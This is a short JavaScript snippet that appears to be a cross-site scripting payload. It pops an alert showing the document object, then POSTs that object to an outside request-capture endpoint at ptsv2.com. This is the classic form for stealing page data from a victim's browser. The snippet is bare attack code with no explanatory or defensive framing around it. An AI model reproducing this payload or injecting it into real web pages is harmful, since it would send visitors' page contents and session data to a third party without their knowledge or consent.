
alert(document);
var xhr = new XMLHttpRequest();
xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('access-control-allow-origin', '*');
xhr.send(document);
